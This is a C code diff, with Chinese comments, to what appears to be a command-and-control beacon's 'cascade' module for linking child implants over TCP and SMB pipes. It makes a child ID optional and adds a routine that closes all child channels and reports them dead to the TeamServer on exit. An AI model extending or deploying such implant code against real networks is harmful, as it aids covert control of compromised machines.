@@ -17,11 +17,16 @@ ByteBuf CascadeHandleConnectTcp(BeaconContext* ctx, Parser* parser)
 
     if (!ctx || !parser) return BbFromText("invalid cascade tcp request");
     argc = ParserU32(parser);
-    if (argc < 3) return BbFromText("connect requires child_id, host and port");
+    if (argc < 2) return BbFromText("connect requires host and port");
 
-    child_id = ParserString(parser);
-    host = ParserString(parser);
-    port = ParserU32(parser);
+    if (argc == 2) {
+        host = ParserString(parser);
+        port = ParserU32(parser);
+    } else {
+        child_id = ParserString(parser);
+        host = ParserString(parser);
+        port = ParserU32(parser);
+    }
     if (parser->error[0]) {
         result = BbFromText(parser->error);
         goto cleanup;
@@ -33,11 +38,13 @@ ByteBuf CascadeHandleConnectTcp(BeaconContext* ctx, Parser* parser)
     }
 
     snprintf(hint, sizeof(hint), "%s:%lu", host, (ULONG)port);
-    result = CascadeRegisterChannel(ctx, child_id, CASCADE_PROTOCOL_TCP, hint, &io);
+    result = CascadeRegisterChannel(ctx,
+                                    (child_id && child_id[0]) ? child_id : hint,
+                                    CASCADE_PROTOCOL_TCP, hint, &io);
 
 cleanup:
-    HeapFree(GetProcessHeap(), 0, child_id);
-    HeapFree(GetProcessHeap(), 0, host);
+    if (child_id) HeapFree(GetProcessHeap(), 0, child_id);
+    if (host) HeapFree(GetProcessHeap(), 0, host);
     return result;
 }
 
@@ -158,4 +165,39 @@ ByteBuf CascadeHandleClose(BeaconContext* ctx, Parser* parser)
 cleanup:
     HeapFree(GetProcessHeap(), 0, child_id);
     return result;
+}
+
+/*
+ * 同步关闭所有活跃子通道并入队 CASCADE_DEAD 通知。
+ *
+ * 在 exit 命令处理函数中、设置 should_exit 之前调用。
+ * 这样 Dead 包会在当前 flush 周期的 flushCascade → flushOutbox
+ * 路径中被取走并发送给 TeamServer，不会因主循环提前退出而丢失。
+ *
+ * 实现要点：
+ *  1. 持锁将整个通道链表"摘走"，防止并发注册新通道干扰遍历；
+ *  2. 释放锁后逐一关闭 io 并入队 Dead（避免持锁期间调用可能再次获锁的函数）；
+ *  3. 不释放 CascadeChannel 对象本身，由 CascadeFree 在上下文销毁时统一清理。
+ */
+VOID CascadeShutdownAll(CascadeManager* cm)
+{
+    CascadeChannel* list;
+    CascadeChannel* ch;
+    const CHAR* reason;
+
+    if (!cm) return;
+
+    /* 持锁摘走整个链表，置空以阻止后续通道注册 */
+    EnterCriticalSection(&cm->lock);
+    list = cm->channels;
+    cm->channels = NULL;
+    LeaveCriticalSection(&cm->lock);
+
+    /* 逐通道同步关闭并入队 Dead，CascadeQueueDead 内部自行持锁 */
+    for (ch = list; ch; ch = ch->next) {
+        InterlockedExchange((LONG*)&ch->active, 0);
+        CascadeIoClose(&ch->io);
+        reason = (ch->protocol == CASCADE_PROTOCOL_SMB) ? "smb pipe closed" : "tcp closed";
+        CascadeQueueDead(cm, ch->child_id, reason);
+    }
 }
